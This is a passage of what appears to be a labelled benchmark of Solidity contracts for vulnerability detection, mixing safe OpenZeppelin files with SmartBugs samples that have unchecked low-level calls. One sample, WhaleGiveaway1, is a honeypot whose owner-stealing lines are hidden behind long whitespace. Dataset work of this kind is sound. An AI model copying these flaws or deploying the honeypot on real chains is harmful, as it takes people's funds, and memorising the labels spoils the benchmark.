    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/extensions/ERC1363.sol)\n\npragma solidity ^0.8.20;\n\nimport {ERC20} from \"../ERC20.sol\";\nimport {IERC165, ERC165} from \"../../../utils/introspection/ERC165.sol\";\nimport {IERC1363} from \"../../../interfaces/IERC1363.sol\";\nimport {ERC1363Utils} from \"../utils/ERC1363Utils.sol\";\n\n/**\n * @title ERC1363\n * @dev Extension of {ERC20} tokens that adds support for code execution after transfers and approvals\n * on recipient contracts. Calls after transfers are enabled through the {ERC1363-transferAndCall} and\n * {ERC1363-transferFromAndCall} methods while calls after approvals can be made with {ERC1363-approveAndCall}\n *\n * _Available since v5.1._\n */\nabstract contract ERC1363 is ERC20, ERC165, IERC1363 {\n    /**\n     * @dev Indicates a failure within the {transfer} part of a transferAndCall operation.\n     * @param receiver Address to which tokens are being transferred.\n     * @param value Amount of tokens to be transferred.\n     */\n    error ERC1363TransferFailed(address receiver, uint256 value);\n\n    /**\n     * @dev Indicates a failure within the {transferFrom} part of a transferFromAndCall operation.\n     * @param sender Address from which to send tokens.\n     * @param receiver Address to which tokens are being transferred.\n     * @param value Amount of tokens to be transferred.\n     */\n    error ERC1363TransferFromFailed(address sender, address receiver, uint256 value);\n\n    /**\n     * @dev Indicates a failure within the {approve} part of a approveAndCall operation.\n     * @param spender Address which will spend the funds.\n     * @param value Amount of tokens to be spent.\n     */\n    error ERC1363ApproveFailed(address spender, uint256 value);\n\n    /// @inheritdoc IERC165\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\n        return interfaceId == type(IERC1363).interfaceId || super.supportsInterface(interfaceId);\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`\n     * and then calls {IERC1363Receiver-onTransferReceived} on `to`. Returns a flag that indicates\n     * if the call succeeded.\n     *\n     * Requirements:\n     *\n     * - The target has code (i.e. is a contract).\n     * - The target `to` must implement the {IERC1363Receiver} interface.\n     * - The target must return the {IERC1363Receiver-onTransferReceived} selector to accept the transfer.\n     * - The internal {transfer} must succeed (returned `true`).\n     */\n    function transferAndCall(address to, uint256 value) public returns (bool) {\n        return transferAndCall(to, value, \"\");\n    }\n\n    /**\n     * @dev Variant of {transferAndCall} that accepts an additional `data` parameter with\n     * no specified format.\n     */\n    function transferAndCall(address to, uint256 value, bytes memory data) public virtual returns (bool) {\n        if (!transfer(to, value)) {\n            revert ERC1363TransferFailed(to, value);\n        }\n        ERC1363Utils.checkOnERC1363TransferReceived(_msgSender(), _msgSender(), to, value, data);\n        return true;\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism\n     * and then calls {IERC1363Receiver-onTransferReceived} on `to`. Returns a flag that indicates\n     * if the call succeeded.\n     *\n     * Requirements:\n     *\n     * - The target has code (i.e. is a contract).\n     * - The target `to` must implement the {IERC1363Receiver} interface.\n     * - The target must return the {IERC1363Receiver-onTransferReceived} selector to accept the transfer.\n     * - The internal {transferFrom} must succeed (returned `true`).\n     */\n    function transferFromAndCall(address from, address to, uint256 value) public returns (bool) {\n        return transferFromAndCall(from, to, value, \"\");\n    }\n\n    /**\n     * @dev Variant of {transferFromAndCall} that accepts an additional `data` parameter with\n     * no specified format.\n     */\n    function transferFromAndCall(\n        address from,\n        address to,\n        uint256 value,\n        bytes memory data\n    ) public virtual returns (bool) {\n        if (!transferFrom(from, to, value)) {\n            revert ERC1363TransferFromFailed(from, to, value);\n        }\n        ERC1363Utils.checkOnERC1363TransferReceived(_msgSender(), from, to, value, data);\n        return true;\n    }\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens and then calls {IERC1363Spender-onApprovalReceived} on `spender`.\n     * Returns a flag that indicates if the call succeeded.\n     *\n     * Requirements:\n     *\n     * - The target has code (i.e. is a contract).\n     * - The target `spender` must implement the {IERC1363Spender} interface.\n     * - The target must return the {IERC1363Spender-onApprovalReceived} selector to accept the approval.\n     * - The internal {approve} must succeed (returned `true`).\n     */\n    function approveAndCall(address spender, uint256 value) public returns (bool) {\n        return approveAndCall(spender, value, \"\");\n    }\n\n    /**\n     * @dev Variant of {approveAndCall} that accepts an additional `data` parameter with\n     * no specified format.\n     */\n    function approveAndCall(address spender, uint256 value, bytes memory data) public virtual returns (bool) {\n        if (!approve(spender, value)) {\n            revert ERC1363ApproveFailed(spender, value);\n        }\n        ERC1363Utils.checkOnERC1363ApprovalReceived(_msgSender(), spender, value, data);\n        return true;\n    }\n}\n",
    "num_lines": 136,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x7a4349a749e59a5736efb7826ee3496a2dfd5489",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x7a4349a749e59a5736efb7826ee3496a2dfd5489.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway1\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 46,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC1967Proxy",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.2.0) (proxy/ERC1967/ERC1967Proxy.sol)\n\npragma solidity ^0.8.22;\n\nimport {Proxy} from \"../Proxy.sol\";\nimport {ERC1967Utils} from \"./ERC1967Utils.sol\";\n\n/**\n * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an\n * implementation address that can be changed. This address is stored in storage in the location specified by\n * https://eips.ethereum.org/EIPS/eip-1967[ERC-1967], so that it doesn't conflict with the storage layout of the\n * implementation behind the proxy.\n */\ncontract ERC1967Proxy is Proxy {\n    /**\n     * @dev The proxy is left uninitialized.\n     */\n    error ERC1967ProxyUninitialized();\n\n    /**\n     * @dev Initializes the upgradeable proxy with an initial implementation specified by `implementation`.\n     *\n     * Provided `_data` is passed in a delegate call to `implementation`. This will typically be an encoded function\n     * call, and allows initializing the storage of the proxy like a Solidity constructor. By default construction\n     * will fail if `_data` is empty. This behavior can be overridden using a custom {_unsafeAllowUninitialized} that\n     * returns true. In that case, empty `_data` is ignored and no delegate call to the implementation is performed\n     * during construction.\n     *\n     * Requirements:\n     *\n     * - If `data` is empty, `msg.value` must be zero.\n     */\n    constructor(address implementation, bytes memory _data) payable {\n        if (!_unsafeAllowUninitialized() && _data.length == 0) {\n            revert ERC1967ProxyUninitialized();\n        }\n        ERC1967Utils.upgradeToAndCall(implementation, _data);\n    }\n\n    /**\n     * @dev Returns the current implementation address.\n     *\n     * TIP: To get this value clients can read directly from the storage slot shown below (specified by ERC-1967) using\n     * the https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\n     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`\n     */\n    function _implementation() internal view virtual override returns (address) {\n        return ERC1967Utils.getImplementation();\n    }\n\n    /**\n     * @dev Returns whether the proxy can be left uninitialized.\n     *\n     * NOTE: Override this function to allow the proxy to be left uninitialized.\n     * Consider uninitialized proxies might be susceptible to man-in-the-middle threats\n     * where the proxy is replaced with a malicious one.\n     */\n    function _unsafeAllowUninitialized() internal pure virtual returns (bool) {\n        return false;\n    }\n}\n",
    "num_lines": 63,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "ERC1155Supply",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC1155/extensions/ERC1155Supply.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC1155/extensions/ERC1155Supply.sol)\n\npragma solidity ^0.8.24;\n\nimport {ERC1155} from \"../ERC1155.sol\";\nimport {Arrays} from \"../../../utils/Arrays.sol\";\n\n/**\n * @dev Extension of ERC-1155 that adds tracking of total supply per id.\n *\n * Useful for scenarios where Fungible and Non-fungible tokens have to be\n * clearly identified. Note: While a `totalSupply` of 1 may mean the\n * corresponding token is an NFT, there are no inherent guarantees that\n * no more tokens with the same id will be minted in future.\n *\n * NOTE: This contract implies a global limit of 2**256 - 1 to the number of tokens\n * that can be minted.\n *\n * CAUTION: This extension should not be added in an upgrade to an already deployed contract.\n */\nabstract contract ERC1155Supply is ERC1155 {\n    using Arrays for uint256[];\n\n    mapping(uint256 id => uint256) private _totalSupply;\n    uint256 private _totalSupplyAll;\n\n    /**\n     * @dev Total value of tokens with a given id.\n     */\n    function totalSupply(uint256 id) public view virtual returns (uint256) {\n        return _totalSupply[id];\n    }\n\n    /**\n     * @dev Total value of tokens.\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupplyAll;\n    }\n\n    /**\n     * @dev Indicates whether any tokens exist with a given id, or not.\n     */\n    function exists(uint256 id) public view virtual returns (bool) {\n        return totalSupply(id) > 0;\n    }\n\n    /// @inheritdoc ERC1155\n    function _update(\n        address from,\n        address to,\n        uint256[] memory ids,\n        uint256[] memory values\n    ) internal virtual override {\n        super._update(from, to, ids, values);\n\n        if (from == address(0)) {\n            uint256 totalMintValue = 0;\n            for (uint256 i = 0; i < ids.length; ++i) {\n                uint256 value = values.unsafeMemoryAccess(i);\n                // Overflow check required: The rest of the code assumes that totalSupply never overflows\n                _totalSupply[ids.unsafeMemoryAccess(i)] += value;\n                totalMintValue += value;\n            }\n            // Overflow check required: The rest of the code assumes that totalSupplyAll never overflows\n            _totalSupplyAll += totalMintValue;\n        }\n\n        if (to == address(0)) {\n            uint256 totalBurnValue = 0;\n            for (uint256 i = 0; i < ids.length; ++i) {\n                uint256 value = values.unsafeMemoryAccess(i);\n\n                unchecked {\n                    // Overflow not possible: values[i] <= balanceOf(from, ids[i]) <= totalSupply(ids[i])\n                    _totalSupply[ids.unsafeMemoryAccess(i)] -= value;\n                    // Overflow not possible: sum_i(values[i]) <= sum_i(totalSupply(ids[i])) <= totalSupplyAll\n                    totalBurnValue += value;\n                }\n            }\n            unchecked {\n                // Overflow not possible: totalBurnValue = sum_i(values[i]) <= sum_i(totalSupply(ids[i])) <= totalSupplyAll\n                _totalSupplyAll -= totalBurnValue;\n            }\n        }\n    }\n}\n",
    "num_lines": 89,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 69,71,73,75,102\n */\n\npragma solidity ^0.4.23;\n\ncontract Splitter{\n    \n\taddress public owner;\n\taddress[] public puppets;\n\tmapping (uint256 => address) public extra;\n\taddress private _addy;\n\tuint256 private _share;\n\tuint256 private _count;\n\n\n//constructor\n\n\tconstructor() payable public{\n\t\towner = msg.sender;\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\textra[0] = puppets[0];\n        extra[1] = puppets[1];\n        extra[2] = puppets[2];\n        extra[3] = puppets[3];\n\t}\n\n//withdraw (just in case)\n\t\n\tfunction withdraw() public{\n\t\trequire(msg.sender == owner);\n\t\towner.transfer(address(this).balance);\n\t}\n\n//puppet count\n\n\tfunction getPuppetCount() public constant returns(uint256 puppetCount){\n    \treturn puppets.length;\n  \t}\n\n//deploy contracts\n\n\tfunction newPuppet() public returns(address newPuppet){\n\t    require(msg.sender == owner);\n    \tPuppet p = new Puppet();\n    \tpuppets.push(p);\n    \treturn p;\n  \t\t}\n \n//update mapping\n\n    function setExtra(uint256 _id, address _newExtra) public {\n        require(_newExtra != address(0));\n        extra[_id] = _newExtra;\n    }\n\n\t\n//fund puppets TROUBLESHOOT gas\n\n    function fundPuppets() public payable {\n        require(msg.sender == owner);\n    \t_share = SafeMath.div(msg.value, 4);\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\n        extra[0].call.value(_share).gas(800000)();\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\n        extra[1].call.value(_share).gas(800000)();\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\n        extra[2].call.value(_share).gas(800000)();\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\n        extra[3].call.value(_share).gas(800000)();\n        }\n        \n//fallback function\n\nfunction() payable public{\n\t}\n}\n\n\ncontract Puppet {\n    \n    mapping (uint256 => address) public target;\n    mapping (uint256 => address) public master;\n\t\n\tconstructor() payable public{\n\t\t//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;\n\t\ttarget[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\n        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n\t}\n\t\n\t//send shares to doubler\n\t//return profit to master\n\n\tfunction() public payable{\n\t    if(msg.sender != target[0]){\n\t\t\t// <yes> <report> UNCHECKED_LL_CALLS\n\t\t\ttarget[0].call.value(msg.value).gas(600000)();\n\t\t}\n    }\n\t//emergency withdraw\n\n\tfunction withdraw() public{\n\t\trequire(msg.sender == master[0]);\n\t\tmaster[0].transfer(address(this).balance);\n\t}\n}\n\n\n//library\n\nlibrary SafeMath {\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (a == 0) {\n      return 0;\n    }\n    c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}",
    "num_lines": 141,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x9d06cbafa865037a01d322d3f4222fa3e04e5488",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x9d06cbafa865037a01d322d3f4222fa3e04e5488.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54,65\n */\n\npragma solidity ^0.4.23;        \n\n// ----------------------------------------------------------------------------------------------\n// Project Delta \n// DELTA - New Crypto-Platform with own cryptocurrency, verified smart contracts and multi blockchains!\n// For 1 DELTA token in future you will get 1 DELTA coin!\n// Site: http://delta.money\n// Telegram Chat: @deltacoin\n// Telegram News: @deltaico\n// CEO Nechesov Andrey http://facebook.com/Nechesov     \n// Telegram: @Nechesov\n// Ltd. \"Delta\"\n// Working with ERC20 contract https://etherscan.io/address/0xf85a2e95fa30d005f629cbe6c6d2887d979fff2a                  \n// ----------------------------------------------------------------------------------------------\n   \ncontract Delta {     \n\n\taddress public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A; \n\taddress public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;\t\n\taddress public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;\t\n\tuint public active = 1;\t\n\n\tuint public token_price = 10**18*1/1000; \t\n\n\t//default function for buy tokens      \n\tfunction() payable {        \n\t    tokens_buy();        \n\t}\n\n\t/**\n\t* Buy tokens\n\t*/\n    function tokens_buy() payable returns (bool) {         \n        \n        require(active > 0);\n        require(msg.value >= token_price);        \n\n        uint tokens_buy = msg.value*10**18/token_price;\n\n        require(tokens_buy > 0);\n\n        if(!c.call(bytes4(sha3(\"transferFrom(address,address,uint256)\")),owner, msg.sender,tokens_buy)){\n        \treturn false;\n        }\n\n        uint sum2 = msg.value * 3 / 10;           \n        // <yes> <report> UNCHECKED_LL_CALLS\n        owner2.send(sum2);\n\n        return true;\n      }     \n\n      //Withdraw money from contract balance to owner\n      function withdraw(uint256 _amount) onlyOwner returns (bool result) {\n          uint256 balance;\n          balance = this.balance;\n          if(_amount > 0) balance = _amount;\n          // <yes> <report> UNCHECKED_LL_CALLS\n          owner.send(balance);\n          return true;\n      }\n\n      //Change token\n      function change_token_price(uint256 _token_price) onlyOwner returns (bool result) {\n        token_price = _token_price;\n        return true;\n      }\n\n      //Change active\n      function change_active(uint256 _active) onlyOwner returns (bool result) {\n        active = _active;\n        return true;\n      }\n\n      // Functions with this modifier can only be executed by the owner\n    \tmodifier onlyOwner() {\n        if (msg.sender != owner) {\n            throw;\n        }\n        _;\n    }        \t\n\n\n}",
    "num_lines": 90,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "Packing",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/Packing.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.2.0) (utils/Packing.sol)\n// This file was procedurally generated from scripts/generate/templates/Packing.js.\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Helper library packing and unpacking multiple values into bytesXX.\n *\n * Example usage:\n *\n * ```solidity\n * library MyPacker {\n *     type MyType is bytes32;\n *\n *     function _pack(address account, bytes4 selector, uint64 period) external pure returns (MyType) {\n *         bytes12 subpack = Packing.pack_4_8(selector, bytes8(period));\n *         bytes32 pack = Packing.pack_20_12(bytes20(account), subpack);\n *         return MyType.wrap(pack);\n *     }\n *\n *     function _unpack(MyType self) external pure returns (address, bytes4, uint64) {\n *         bytes32 pack = MyType.unwrap(self);\n *         return (\n *             address(Packing.extract_32_20(pack, 0)),\n *             Packing.extract_32_4(pack, 20),\n *             uint64(Packing.extract_32_8(pack, 24))\n *         );\n *     }\n * }\n * ```\n *\n * _Available since v5.1._\n */\n// solhint-disable func-name-mixedcase\nlibrary Packing {\n    error OutOfRangeAccess();\n\n    function pack_1_1(bytes1 left, bytes1 right) internal pure returns (bytes2 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(248, not(0)))\n            right := and(right, shl(248, not(0)))\n            result := or(left, shr(8, right))\n        }\n    }\n\n    function pack_2_2(bytes2 left, bytes2 right) internal pure returns (bytes4 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(240, not(0)))\n            right := and(right, shl(240, not(0)))\n            result := or(left, shr(16, right))\n        }\n    }\n\n    function pack_2_4(bytes2 left, bytes4 right) internal pure returns (bytes6 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(240, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(16, right))\n        }\n    }\n\n    function pack_2_6(bytes2 left, bytes6 right) internal pure returns (bytes8 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(240, not(0)))\n            right := and(right, shl(208, not(0)))\n            result := or(left, shr(16, right))\n        }\n    }\n\n    function pack_2_8(bytes2 left, bytes8 right) internal pure returns (bytes10 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(240, not(0)))\n            right := and(right, shl(192, not(0)))\n            result := or(left, shr(16, right))\n        }\n    }\n\n    function pack_2_10(bytes2 left, bytes10 right) internal pure returns (bytes12 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(240, not(0)))\n            right := and(right, shl(176, not(0)))\n            result := or(left, shr(16, right))\n        }\n    }\n\n    function pack_2_20(bytes2 left, bytes20 right) internal pure returns (bytes22 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(240, not(0)))\n            right := and(right, shl(96, not(0)))\n            result := or(left, shr(16, right))\n        }\n    }\n\n    function pack_2_22(bytes2 left, bytes22 right) internal pure returns (bytes24 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(240, not(0)))\n            right := and(right, shl(80, not(0)))\n            result := or(left, shr(16, right))\n        }\n    }\n\n    function pack_4_2(bytes4 left, bytes2 right) internal pure returns (bytes6 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(240, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_4_4(bytes4 left, bytes4 right) internal pure returns (bytes8 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_4_6(bytes4 left, bytes6 right) internal pure returns (bytes10 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(208, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_4_8(bytes4 left, bytes8 right) internal pure returns (bytes12 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(192, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_4_12(bytes4 left, bytes12 right) internal pure returns (bytes16 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(160, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_4_16(bytes4 left, bytes16 right) internal pure returns (bytes20 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(128, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_4_20(bytes4 left, bytes20 right) internal pure returns (bytes24 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(96, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_4_24(bytes4 left, bytes24 right) internal pure returns (bytes28 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(64, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_4_28(bytes4 left, bytes28 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(224, not(0)))\n            right := and(right, shl(32, not(0)))\n            result := or(left, shr(32, right))\n        }\n    }\n\n    function pack_6_2(bytes6 left, bytes2 right) internal pure returns (bytes8 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(208, not(0)))\n            right := and(right, shl(240, not(0)))\n            result := or(left, shr(48, right))\n        }\n    }\n\n    function pack_6_4(bytes6 left, bytes4 right) internal pure returns (bytes10 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(208, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(48, right))\n        }\n    }\n\n    function pack_6_6(bytes6 left, bytes6 right) internal pure returns (bytes12 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(208, not(0)))\n            right := and(right, shl(208, not(0)))\n            result := or(left, shr(48, right))\n        }\n    }\n\n    function pack_6_10(bytes6 left, bytes10 right) internal pure returns (bytes16 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(208, not(0)))\n            right := and(right, shl(176, not(0)))\n            result := or(left, shr(48, right))\n        }\n    }\n\n    function pack_6_16(bytes6 left, bytes16 right) internal pure returns (bytes22 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(208, not(0)))\n            right := and(right, shl(128, not(0)))\n            result := or(left, shr(48, right))\n        }\n    }\n\n    function pack_6_22(bytes6 left, bytes22 right) internal pure returns (bytes28 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(208, not(0)))\n            right := and(right, shl(80, not(0)))\n            result := or(left, shr(48, right))\n        }\n    }\n\n    function pack_8_2(bytes8 left, bytes2 right) internal pure returns (bytes10 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(192, not(0)))\n            right := and(right, shl(240, not(0)))\n            result := or(left, shr(64, right))\n        }\n    }\n\n    function pack_8_4(bytes8 left, bytes4 right) internal pure returns (bytes12 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(192, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(64, right))\n        }\n    }\n\n    function pack_8_8(bytes8 left, bytes8 right) internal pure returns (bytes16 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(192, not(0)))\n            right := and(right, shl(192, not(0)))\n            result := or(left, shr(64, right))\n        }\n    }\n\n    function pack_8_12(bytes8 left, bytes12 right) internal pure returns (bytes20 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(192, not(0)))\n            right := and(right, shl(160, not(0)))\n            result := or(left, shr(64, right))\n        }\n    }\n\n    function pack_8_16(bytes8 left, bytes16 right) internal pure returns (bytes24 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(192, not(0)))\n            right := and(right, shl(128, not(0)))\n            result := or(left, shr(64, right))\n        }\n    }\n\n    function pack_8_20(bytes8 left, bytes20 right) internal pure returns (bytes28 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(192, not(0)))\n            right := and(right, shl(96, not(0)))\n            result := or(left, shr(64, right))\n        }\n    }\n\n    function pack_8_24(bytes8 left, bytes24 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(192, not(0)))\n            right := and(right, shl(64, not(0)))\n            result := or(left, shr(64, right))\n        }\n    }\n\n    function pack_10_2(bytes10 left, bytes2 right) internal pure returns (bytes12 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(176, not(0)))\n            right := and(right, shl(240, not(0)))\n            result := or(left, shr(80, right))\n        }\n    }\n\n    function pack_10_6(bytes10 left, bytes6 right) internal pure returns (bytes16 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(176, not(0)))\n            right := and(right, shl(208, not(0)))\n            result := or(left, shr(80, right))\n        }\n    }\n\n    function pack_10_10(bytes10 left, bytes10 right) internal pure returns (bytes20 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(176, not(0)))\n            right := and(right, shl(176, not(0)))\n            result := or(left, shr(80, right))\n        }\n    }\n\n    function pack_10_12(bytes10 left, bytes12 right) internal pure returns (bytes22 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(176, not(0)))\n            right := and(right, shl(160, not(0)))\n            result := or(left, shr(80, right))\n        }\n    }\n\n    function pack_10_22(bytes10 left, bytes22 right) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(176, not(0)))\n            right := and(right, shl(80, not(0)))\n            result := or(left, shr(80, right))\n        }\n    }\n\n    function pack_12_4(bytes12 left, bytes4 right) internal pure returns (bytes16 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(160, not(0)))\n            right := and(right, shl(224, not(0)))\n            result := or(left, shr(96, right))\n        }\n    }\n\n    function pack_12_8(bytes12 left, bytes8 right) internal pure returns (bytes20 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(160, not(0)))\n            right := and(right, shl(192, not(0)))\n            result := or(left, shr(96, right))\n        }\n    }\n\n    function pack_12_10(bytes12 left, bytes10 right) internal pure returns (bytes22 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(160, not(0)))\n            right := and(right, shl(176, not(0)))\n            result := or(left, shr(96, right))\n        }\n    }\n\n    function pack_12_12(bytes12 left, bytes12 right) internal pure returns (bytes24 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(160, not(0)))\n            right := and(right, shl(160, not(0)))\n            result := or(left, shr(96, right))\n        }\n    }\n\n    function pack_12_16(bytes12 left, bytes16 right) internal pure returns (bytes28 result) {\n        assembly (\"memory-safe\") {\n            left := and(left, shl(160, not(0)))\n            right := and(right, shl(128, not(0)))\n            result := or(left, shr(96, right))\n        }\n    }\n\n  